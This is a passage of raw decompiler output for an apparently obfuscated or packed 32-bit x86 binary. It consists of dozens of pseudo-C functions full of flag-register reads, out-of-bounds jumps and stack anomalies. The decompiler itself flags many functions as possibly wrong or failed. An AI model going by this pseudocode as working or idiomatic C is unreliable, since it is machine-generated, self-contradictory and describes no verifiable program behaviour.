  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50B95B: positive sp value 54 has been found
// 50B976: control flows out of bounds to 50CA61

//----- (0050B9AF) --------------------------------------------------------
#error "50B9AF: call analysis failed (funcsize=30)"

//----- (0050BA0B) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_50BA0B@<eax>(
        char a1@<pf>,
        _DWORD *a2@<ebp>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12)
{
  int v13; // [esp-38h] [ebp-38h]

  if ( a1 )
  {
    *a2 = v13;
    __readeflags();
    JUMPOUT(0x407FBA);
  }
  sub_50C8F6();
  return sub_50CC70(a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50BA16: variable 'v13' is possibly undefined
// 50C8F6: using guessed type _DWORD sub_50C8F6();
// 50CC70: using guessed type _DWORD __cdecl sub_50CC70(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050BA23) --------------------------------------------------------
void sub_50BA23()
{
  JUMPOUT(0x50B13C);
}
// 50BA25: control flows out of bounds to 50B13C

//----- (0050BA4C) --------------------------------------------------------
#error "50BA6B: call analysis failed (funcsize=10)"

//----- (0050BA70) --------------------------------------------------------
void __stdcall sub_50BA70(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17)
{
  __asm { retn    44h ; 'D' }
}
// 50BA83: unbalanced stack, ignored a potential tail call

//----- (0050BAB2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50BAB2(
        int a1@<eax>,
        _DWORD *a2@<ebp>,
        int a3,
        int a4,
        char a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  *a2 = a1;
  JUMPOUT(0x50B71E);
}
// 50BABE: positive sp value 28 has been found
// 50BABE: control flows out of bounds to 50B71E

//----- (0050BB23) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50BB23(_WORD *a1@<eax>, _WORD *a2@<ebp>, char a3)
{
  __readeflags();
  *a2 = *a1;
  JUMPOUT(0x50B71E);
}
// 4080C9: positive sp value C has been found
// 4080C9: control flows out of bounds to 50B71E

//----- (0050BB2D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50BB2D(
        _DWORD *a1@<ebp>,
        int a2,
        int a3,
        int a4,
        int a5,
        char a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22)
{
  int v22; // [esp-4h] [ebp-4h]

  *a1 = v22;
  JUMPOUT(0x50B71E);
}
// 50BB44: positive sp value 34 has been found
// 50BB44: control flows out of bounds to 50B71E
// 50BB39: variable 'v22' is possibly undefined

//----- (0050BB49) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50BB49(
        _DWORD *a1@<ebp>,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11)
{
  int v11; // [esp-8h] [ebp-3Ch]

  __readeflags();
  __readeflags();
  *a1 = v11;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50BAC7: variable 'v11' is possibly undefined

//----- (0050BB83) --------------------------------------------------------
#error "50BB8F: call analysis failed (funcsize=22)"

//----- (0050BBBE) --------------------------------------------------------
void sub_50BBBE()
{
  JUMPOUT(0x50C458);
}
// 50B2D9: control flows out of bounds to 50C458

//----- (0050BBD3) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50BBD3(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8,
        int a9,
        __int16 a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28)
{
  unsigned int v28; // kr00_4
  int v29; // eax
  int v30; // edx
  int v31; // ecx
  unsigned int v32; // kr04_4
  unsigned int v33; // kr08_4
  unsigned int v34; // kr0C_4
  unsigned int v35; // kr10_4
  unsigned int v36; // [esp-48h] [ebp-70h]
  unsigned int v37; // [esp-44h] [ebp-6Ch]
  int v38; // [esp-40h] [ebp-68h]
  int v39; // [esp-3Ch] [ebp-64h]
  int v40; // [esp-38h] [ebp-60h]
  int v41; // [esp-34h] [ebp-5Ch]
  unsigned int *v42; // [esp-30h] [ebp-58h]
  unsigned int v46; // [esp-20h] [ebp-48h] BYREF
  int v47; // [esp-1Ch] [ebp-44h]
  int v48; // [esp-18h] [ebp-40h]
  int v49; // [esp-14h] [ebp-3Ch]
  int v50; // [esp-10h] [ebp-38h]
  int *v51; // [esp-Ch] [ebp-34h]
  unsigned int v52; // [esp-8h] [ebp-30h]
  int v53; // [esp-4h] [ebp-2Ch]
  int v54; // [esp+0h] [ebp-28h]
  int v55; // [esp+4h] [ebp-24h] BYREF
  int v56; // [esp+8h] [ebp-20h]
  _DWORD *v57; // [esp+Ch] [ebp-1Ch]
  int v58; // [esp+10h] [ebp-18h]
  int v59; // [esp+14h] [ebp-14h]
  void **v60; // [esp+18h] [ebp-10h]
  _DWORD v61[3]; // [esp+1Ch] [ebp-Ch] BYREF
  void *retaddr; // [esp+28h] [ebp+0h] BYREF

  v61[0] = -926849112;
  v60 = (void **)a7;
  v59 = a6;
  v58 = a5;
  v57 = v61;
  v56 = a4;
  v55 = a3;
  v54 = a2;
  v53 = a1;
  v28 = __readeflags();
  v52 = v28;
  v51 = (int *)a2;
  LOBYTE(a1) = (a1 - 1) ^ 0xE;
  if ( !(_BYTE)a1 )
  {
    sub_50BA23();
    JUMPOUT(0x50C15A);
  }
  v61[2] = a7;
  v61[1] = a6;
  v61[0] = a5;
  v60 = &retaddr;
  v59 = a4;
  v58 = a3;
  v57 = (_DWORD *)a2;
  v56 = a1;
  LOBYTE(a1) = a1 - 1;
  LOBYTE(a4) = a4 - a1;
  v29 = sub_50C2E6(a1, a5, a6, 28);
  v51 = &v55;
  v50 = a4;
  v49 = v31;
  v48 = v30;
  v47 = v29;
  v32 = __readeflags();
  v46 = v32;
  v54 = a6;
  v42 = &v46;
  v41 = a4;
  v40 = v31;
  v39 = v30;
  v38 = v29;
  v33 = __readeflags();
  v37 = v33;
  v53 = a7;
  v34 = __readeflags();
  v36 = v34;
  v52 = a4;
  v35 = __readeflags();
  sub_50C495(v35, v36, v37, v38, v39, v40, v41, v42, a5, a6, a7, v46, v47, v48, v49, v50, v51);
  sub_50C1B9(a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27);
}
// 50BBE3: positive sp value 8 has been found
// 50C698: control flows out of bounds to 50C15A
// 50BBF8: variable 'v31' is possibly undefined
// 50BBF8: variable 'v30' is possibly undefined
// 50C495: using guessed type _DWORD __cdecl sub_50C495(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050C0C2) --------------------------------------------------------
#error "50B3D2: call analysis failed (funcsize=32)"

//----- (0050C0CE) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50C0CE(
        _DWORD *a1@<eax>,
        int a2@<ebp>,
        int a3,
        __int16 a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  *a1 = *(_DWORD *)(a2 + 4);
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50C74C: positive sp value 24 has been found
// 50C74C: control flows out of bounds to 50B71E

//----- (0050C0E1) --------------------------------------------------------
void __userpurge sub_50C0E1(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28)
{
  char v28; // kr00_1
  _WORD *v29; // eax
  __int16 v30; // dx
  void **v35; // [esp-10h] [ebp-10h]
  void *retaddr; // [esp+0h] [ebp+0h] BYREF

  v35 = &retaddr;
  v28 = __readeflags();
  sub_50B7B6(v28, a1, a2, a3, a4, (int)v35, a5, a6, a7);
  sub_50C0EC(
    v29,
    v30,
    a8,
    a9,
    a10,
    a11,
    a12,
    a13,
    a14,
    a15,
    a16,
    a17,
    a18,
    a19,
    a20,
    a21,
    a22,
    a23,
    a24,
    a25,
    a26,
    a27,
    a28);
}
// 50C0E8: variable 'v29' is possibly undefined
// 50C0E8: variable 'v30' is possibly undefined

//----- (0050C0EC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50C0EC(
        _WORD *a1@<eax>,
        __int16 a2@<dx>,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23)
{
  *a1 = a2;
  JUMPOUT(0x50B71E);
}
// 50C0FA: positive sp value 28 has been found
// 50C0FA: control flows out of bounds to 50B71E

//----- (0050C12A) --------------------------------------------------------
void sub_50C12A()
{
  JUMPOUT(0x50C30A);
}
// 50C131: control flows out of bounds to 50C30A

//----- (0050C13F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_50C13F(
        char a1@<sf>,
        char a2@<of>,
        int a3@<eax>,
        int a4@<edx>,
        int a5@<ecx>,
        unsigned int a6@<ebx>,
        _DWORD *a7@<ebp>,
        int a8@<edi>,
        _BYTE *_ESI@<esi>,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30)
{
  __int64 v30; // rax
  unsigned int v31; // kr04_4
  int v32; // ecx
  __int64 v33; // rax
  char v34; // cf
  int v36; // edi
  unsigned int v37; // kr0C_4
  int v38; // eax
  char v40; // sp
  int v43; // [esp+10h] [ebp-34h]
  _DWORD v44[3]; // [esp+14h] [ebp-30h] BYREF
  _BYTE *v45; // [esp+20h] [ebp-24h]
  int v46; // [esp+24h] [ebp-20h] BYREF
  unsigned int v47; // [esp+28h] [ebp-1Ch]
  int v48[2]; // [esp+3Ch] [ebp-8h] BYREF

  LOBYTE(v44[0]) = -33;
  if ( a1 != a2 )
  {
    v44[0] = a3;
    v30 = ((__int64 (__stdcall *)(int, char, int, int, unsigned int, _DWORD *, _DWORD *, int, int))sub_50C86D)(
            a3,
            a3,
            a4,
            a5,
            a6,
            v44,
            a7,
            a8,
            a8);
    __readeflags();
    v31 = __readeflags();
    v48[0] = v31;
    v47 = a6;
    v48[1] = v30;
    LOBYTE(v47) = v32;
    v33 = ((__int64 (__cdecl *)(_DWORD, _DWORD, int, unsigned int, int *, _DWORD *, int, _BYTE *))sub_50CDA8)(
            v30,
            HIDWORD(v30),
            v32,
            v47,
            v48,
            a7,
            a8,
            _ESI);
    LOWORD(_ESI) = (_WORD)_ESI - (v34 + WORD2(v33));
    v36 = (int)v45;
    __asm { rcl     si, cl }
    v45 = _ESI;
    v44[2] = v36;
    v44[1] = a7;
    v44[0] = &v46;
    __readeflags();
    __writeeflags(v47);
  }
  else
  {
    v43 = -98542308;
    v37 = __readeflags();
    v38 = ((int (__cdecl *)(unsigned int, int, int))sub_50B9AF)(v37, v43, a3);
    __asm { rcl     dh, 6 }
    _DX = _DX & ~(1 << (v40 & 0xF));
    HIBYTE(_DX) = ~HIBYTE(_DX);
    --_DX;
    __asm { rcr     dh, cl }
    LOBYTE(v38) = 1 - (a6 ^ *_ESI) - 126;
    __readeflags();
    *(_DWORD *)(v38 + a8) = *a7;
    __readeflags();
  }
  JUMPOUT(0x50B71E);
}
// 50C15A: positive sp value 34 has been found
// 50C18E: control flows out of bounds to 50B71E
// 50C161: variable 'v32' is possibly undefined
// 50C16A: variable 'v34' is possibly undefined
// 50C9B5: variable '_DX' is possibly undefined
// 50C9B5: variable 'v40' is possibly undefined
// 50B9AF: using guessed type _DWORD sub_50B9AF();
// 50C86D: using guessed type _DWORD __stdcall sub_50C86D(_DWORD, char, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 50CDA8: using guessed type _DWORD __cdecl __far sub_50CDA8(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0050C193) --------------------------------------------------------
#error "50B914: call analysis failed (funcsize=5)"

//----- (0050C1A1) --------------------------------------------------------
void __cdecl sub_50C1A1(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14)
{
  JUMPOUT(0x50C5B4);
}
// 50C1A5: control flows out of bounds to 50C5B4

//----- (0050C1B9) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C1B9(
        int a1,
        int a2,
        __int16 a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20)
{
  void *v24; // [esp-48h] [ebp-50h]
  void *retaddr; // [esp+8h] [ebp+0h]

  __readeflags();
  __asm { rep pushf }
  retaddr = v24;
  JUMPOUT(0x50CA61);
}
// 50CE08: positive sp value 48 has been found
// 50CE08: control flows out of bounds to 50CA61
// 50CDF0: variable 'v24' is possibly undefined

//----- (0050C1C2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C1C2(int a1, int a2, int a3, int a4)
{
  void *v8; // [esp-14h] [ebp-24h]
  void *retaddr; // [esp+10h] [ebp+0h]

  __getcallerseflags();
  __readeflags();
  __readeflags();
  __readeflags();
  __readeflags();
  __asm { rep pushf }
  retaddr = v8;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50C1DA: positive sp value C has been found
// 50C1DA: control flows out of bounds to 50CA61
// 50C1CD: variable 'v8' is possibly undefined

//----- (0050C225) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C225(
        char a1,
        int a2,
        __int16 a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20)
{
  void *v24; // [esp-54h] [ebp-54h]
  void *retaddr; // [esp+0h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v24;
  JUMPOUT(0x50CA61);
}
// 50C23E: positive sp value 50 has been found
// 50C23E: control flows out of bounds to 50CA61
// 50C227: variable 'v24' is possibly undefined

//----- (0050C2E6) --------------------------------------------------------
int __usercall sub_50C2E6@<eax>(int a1@<eax>, int a2@<ebp>, int a3@<edi>, char a4)
{
  LOBYTE(a1) = *(_BYTE *)(a1 + a3);
  __readeflags();
  sub_50C33E(a1, (_WORD *)(a2 - 2));
  return sub_50C432();
}
// 50C432: using guessed type int sub_50C432(void);

//----- (0050C2F1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C2F1(__int16 a1@<ax>, _WORD *a2@<ebp>)
{
  *a2 = a1;
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50C2FB: positive sp value 38 has been found
// 50C2FB: control flows out of bounds to 50B71E

//----- (0050C305) --------------------------------------------------------
#error "50C305: call analysis failed (funcsize=33)"

//----- (0050C33E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C33E(__int16 a1@<ax>, _WORD *a2@<ebp>)
{
  *a2 = a1;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050C352) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C352(
        int a1,
        int a2,
        int a3,
        char a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17)
{
  void *v21; // [esp-40h] [ebp-40h]
  void *retaddr; // [esp+0h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v21;
  JUMPOUT(0x50CA61);
}
// 50C125: positive sp value 3C has been found
// 50C125: control flows out of bounds to 50CA61
// 50C118: variable 'v21' is possibly undefined

//----- (0050C369) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C369(__int16 a1@<ax>, _WORD *a2@<ebp>)
{
  *a2 = a1;
  __readeflags();
  JUMPOUT(0x50B71E);
}
// 50C376: positive sp value 8 has been found
// 50C376: control flows out of bounds to 50B71E

//----- (0050C37B) --------------------------------------------------------
void __cdecl sub_50C37B(int a1, int a2)
{
  void *v6; // [esp-4Ch] [ebp-4Ch]
  void *retaddr; // [esp+0h] [ebp+0h]

  __readeflags();
  __asm { rep pushf }
  retaddr = v6;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50C7C2: control flows out of bounds to 50CA61
// 50C7B9: variable 'v6' is possibly undefined

//----- (0050C385) --------------------------------------------------------
#error "50C385: call analysis failed (funcsize=5)"

//----- (0050C38F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C38F(
        int a1@<ebx>,
        _DWORD *a2@<ebp>,
        int a3@<edi>,
        int a4@<esi>,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        char a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24)
{
  int v24; // eax
  int v25; // edx
  int v26; // ecx
  unsigned int v27; // kr00_4
  unsigned int v28; // kr04_4
  int v32; // [esp-2Ch] [ebp-54h]
  int v33; // [esp-28h] [ebp-50h]
  int v34; // [esp-24h] [ebp-4Ch]
  int v35; // [esp-20h] [ebp-48h]
  int v36; // [esp-1Ch] [ebp-44h]
  int v37; // [esp-18h] [ebp-40h]
  int v38; // [esp-14h] [ebp-3Ch]
  int v39; // [esp-10h] [ebp-38h]
  int v40; // [esp-Ch] [ebp-34h]
  int v41; // [esp-8h] [ebp-30h]
  int v42; // [esp-4h] [ebp-2Ch]
  unsigned int v43; // [esp-4h] [ebp-2Ch]
  int v44; // [esp+0h] [ebp-28h]
  int v45; // [esp+0h] [ebp-28h]
  int v46; // [esp+4h] [ebp-24h]
  int v47; // [esp+4h] [ebp-24h]
  int v48; // [esp+8h] [ebp-20h]
  int v49; // [esp+8h] [ebp-20h]
  int v50; // [esp+Ch] [ebp-1Ch]
  int v52; // [esp+10h] [ebp-18h]
  int *v53; // [esp+10h] [ebp-18h]
  int v54; // [esp+14h] [ebp-14h]
  int v56; // [esp+18h] [ebp-10h]
  int v58; // [esp+1Ch] [ebp-Ch]
  int v59; // [esp+20h] [ebp-8h] BYREF
  int v60; // [esp+24h] [ebp-4h]

  sub_50CDC5(
    a2,
    v32,
    v33,
    v34,
    v35,
    v36,
    v37,
    v38,
    v39,
    v40,
    v41,
    v42,
    v44,
    v46,
    v48,
    v50,
    v52,
    v54,
    v56,
    v58,
    v59,
    v60);
  v53 = &v59;
  v49 = v26;
  v47 = v25;
  v45 = v24;
  v60 = v24;
  v27 = __readeflags();
  v43 = v27;
  LOBYTE(v45) = BYTE1(v25);
  v28 = __readeflags();
  v59 = a3;
  ((void (__cdecl *)(int, unsigned int, unsigned int, int, int, int, int, int *, _DWORD *, int, int))sub_50CADC)(
    v25,
    v28,
    v43,
    v45,
    v47,
    v49,
    a1,
    v53,
    a2,
    a3,
    a4);
  _DX = _CL;
  __asm { rcr     dx, cl }
  JUMPOUT(0x50CD86);
}
// 50C394: positive sp value 54 has been found
// 50C3DC: control flows out of bounds to 50CD86
// 50C38F: variable 'v32' is possibly undefined
// 50C38F: variable 'v33' is possibly undefined
// 50C38F: variable 'v34' is possibly undefined
// 50C38F: variable 'v35' is possibly undefined
// 50C38F: variable 'v36' is possibly undefined
// 50C38F: variable 'v37' is possibly undefined
// 50C38F: variable 'v38' is possibly undefined
// 50C38F: variable 'v39' is possibly undefined
// 50C38F: variable 'v40' is possibly undefined
// 50C38F: variable 'v41' is possibly undefined
// 50C38F: variable 'v42' is possibly undefined
// 50C38F: variable 'v44' is possibly undefined
// 50C38F: variable 'v46' is possibly undefined
// 50C38F: variable 'v48' is possibly undefined
// 50C38F: variable 'v50' is possibly undefined
// 50C38F: variable 'v52' is possibly undefined
// 50C38F: variable 'v54' is possibly undefined
// 50C38F: variable 'v56' is possibly undefined
// 50C38F: variable 'v58' is possibly undefined
// 50C39A: variable 'v26' is possibly undefined
// 50C39A: variable 'v25' is possibly undefined
// 50C39A: variable 'v24' is possibly undefined
// 50C3B6: variable '_CL' is possibly undefined
// 50CADC: using guessed type _DWORD sub_50CADC();

//----- (0050C432) --------------------------------------------------------
#error "50CDA3: call analysis failed (funcsize=16)"

//----- (0050C495) --------------------------------------------------------
#error "50C499: call analysis failed (funcsize=2)"

//----- (0050C4A8) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C4A8(int a1)
{
  unsigned int v1; // [esp+1Ch] [ebp-4h]

  __writeeflags(v1);
  JUMPOUT(0x50B71E);
}
// 50C4BC: positive sp value 8 has been found
// 50C4BC: control flows out of bounds to 50B71E
// 50C4AC: variable 'v1' is possibly undefined

//----- (0050C52C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C52C(unsigned __int8 a1@<bl>, int a2@<ebp>, int a3@<edi>, unsigned __int8 *a4@<esi>)
{
  int v4; // eax
  char v5; // of

  v4 = *a4;
  if ( a1 == (unsigned __int8)v4 )
  {
    if ( v5 )
    {
      LOBYTE(v4) = -125;
      if ( !__OFADD__(-126, 1) )
      {
        __readeflags();
        *(_DWORD *)(a2 - 4) = *(_DWORD *)(v4 + a3);
        __readeflags();
        __readeflags();
        JUMPOUT(0x407FBA);
      }
      JUMPOUT(0x50CD4F);
    }
    JUMPOUT(0x50C757);
  }
  JUMPOUT(0x50B3D7);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA
// 50C545: control flows out of bounds to 50B3D7
// 50C554: control flows out of bounds to 50C757
// 50C563: control flows out of bounds to 50CD4F
// 50C554: variable 'v5' is possibly undefined

//----- (0050C5BE) --------------------------------------------------------
int __usercall sub_50C5BE@<eax>(char a1@<al>, int a2@<ebp>, int a3@<edi>, char a4, __int16 a5)
{
  int v5; // eax

  __readeflags();
  __readeflags();
  sub_50CB36((char)(a1 - 59), a2);
  return sub_50C2E6(v5, a2, a3, a4);
}
// 50C2E2: variable 'v5' is possibly undefined

//----- (0050C5CF) --------------------------------------------------------
void __usercall sub_50C5CF(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<ebp>,
        int a6@<edi>,
        int a7@<esi>)
{
  int v8; // [esp+4h] [ebp-20h]
  char v9[4]; // [esp+20h] [ebp-4h] BYREF

  v8 = a2;
  LOBYTE(v8) = BYTE1(a2);
  LOBYTE(a1) = BYTE1(a4);
  sub_50C880(a1, v8, a3, a4, v9, a5, a6, a7);
  v9[0] = 90;
  __readeflags();
  __readeflags();
  JUMPOUT(0x50B701);
}
// 50C5EC: control flows out of bounds to 50B701
// 50C880: using guessed type _DWORD __cdecl sub_50C880(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 50C5CF: using guessed type char var_4[4];

//----- (0050C604) --------------------------------------------------------
void __userpurge sub_50C604(
        unsigned int *a1@<ebp>,
        int a2@<edi>,
        int a3@<esi>,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24)
{
  int v24; // eax
  unsigned int v25; // kr04_4
  char v26; // of
  unsigned int v27; // kr08_4
  int v28; // eax
  int v29; // [esp-8h] [ebp-10h]

  __readeflags();
  v24 = ((int (*)(void))loc_50B17D)();
  if ( !v26 )
  {
    v25 = __readeflags();
    sub_50B8C2(v25);
    JUMPOUT(0x50BC5D);
  }
  v29 = 1683932206;
  v27 = __readeflags();
  v28 = ((int (__cdecl *)(int, unsigned int, int, int, int, int))loc_50BB8A)(1445391679, v27, v29, a3, a2, v24);
  sub_50CCFE(v28, a1, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24);
}
// 50BC58: control flows out of bounds to 50BC5D
// 50CCE7: variable 'v26' is possibly undefined
// 50B8C2: using guessed type _DWORD __cdecl sub_50B8C2(_DWORD);

//----- (0050C625) --------------------------------------------------------
void __stdcall sub_50C625(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21)
{
  __readeflags();
  __readeflags();
  JUMPOUT(0x50CC94);
}
// 50C62C: control flows out of bounds to 50CC94

//----- (0050C636) --------------------------------------------------------
void sub_50C636()
{
  __getcallerseflags();
  __readeflags();
  __readeflags();
  sub_50B2BB();
  JUMPOUT(0x50C64A);
}
// 50C645: control flows out of bounds to 50C64A

//----- (0050C670) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C670(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  void *v13; // [esp-28h] [ebp-2Ch]
  void *retaddr; // [esp+4h] [ebp+0h]

  __readeflags();
  __asm { rep pushf }
  retaddr = v13;
  __readeflags();
  JUMPOUT(0x50CA61);
}
// 50C68E: positive sp value 20 has been found
// 50C68E: control flows out of bounds to 50CA61
// 50C67F: variable 'v13' is possibly undefined

//----- (0050C6DE) --------------------------------------------------------
#error "50CD3B: call analysis failed (funcsize=8)"

//----- (0050C718) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C718(
        int a1@<ebx>,
        __int16 a2@<di>,
        int a3,
        int a4,
        int a5,
        int a6,
        char a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16)
{
  void *v20; // [esp-34h] [ebp-38h]
  void *retaddr; // [esp+4h] [ebp+0h]

  ((void (__cdecl *)(__int16, int))loc_50CAFD)(a2, a1);
  __asm { rep pushf }
  retaddr = v20;
  JUMPOUT(0x50CA61);
}
// 50C276: positive sp value 30 has been found
// 50C276: control flows out of bounds to 50CA61
// 50C262: variable 'v20' is possibly undefined

//----- (0050C72E) --------------------------------------------------------
#error "50C731: call analysis failed (funcsize=2)"

//----- (0050C736) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_50C736(int a1@<edx>, int a2@<ebp>)
{
  __getcallerseflags();
  __readeflags();
  *(_DWORD *)(a2 - 4) = a1;
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050C7A2) --------------------------------------------------------
void __stdcall sub_50C7A2(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  __readeflags();
  __readeflags();
  __asm { retn    3Ch ; '<' }
}
// 50C7B4: unbalanced stack, ignored a potential tail call

//----- (0050C7E1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __cdecl sub_50C7E1(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  void *v12; // [esp-20h] [ebp-44h]
  void *retaddr; // [esp+24h] [ebp+0h]

  __asm { rep pushf }
  retaddr = v12;
  JUMPOUT(0x50CA61);
}
// 50B245: positive sp value 1C has been found
// 50B245: control flows out of bounds to 50CA61
// 50B236: variable 'v12' is possibly undefined

//----- (0050C80C) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_50C80C()
{
  __readeflags();
  __readeflags();
  JUMPOUT(0x407FBA);
}
// 408039: positive sp value 3C has been found
// 40803F: control flows out of bounds to 407FBA

//----- (0050C81B) --------------------------------------------------------
#error "50C824: call analysis failed (funcsize=28)"

//----- (0050C86D) --------------------------------------------------------
